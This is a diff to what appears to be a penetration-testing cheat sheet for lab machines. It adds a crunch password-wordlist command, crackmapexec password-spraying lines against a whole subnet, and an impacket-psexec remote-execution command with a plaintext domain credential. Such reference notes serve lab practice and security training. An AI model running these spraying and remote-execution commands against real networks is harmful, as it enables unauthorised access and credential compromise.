@@ -149,6 +149,7 @@ cewl www.domain.com -m 6 -w wordlist.txt
 |^ |Special characters including space|
 ```
 crunch 6 6 -t %%%%^^ > chars.txt
+crunch 24 24 -t ThisIsTheUsersPassword%% -o crunched.txt 
 ```
 
 
@@ -755,6 +756,8 @@ ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local"
 ```bash
 crackmapexec smb 10.10.10.161 --pass-pol
 crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
+crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt
+crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt --continue-on-success
 ```
 * cracking considering lockout policy, see [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
 
@@ -765,6 +768,7 @@ crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
 
 ``` bash
 psexec.py whiterose.local/ealderson:Password!@192.168.92.129
+impacket-psexec whiterose.local/ealderson:Password!@192.168.92.129
 ```
 
 * https://github.com/Hackplayers/evil-winrm
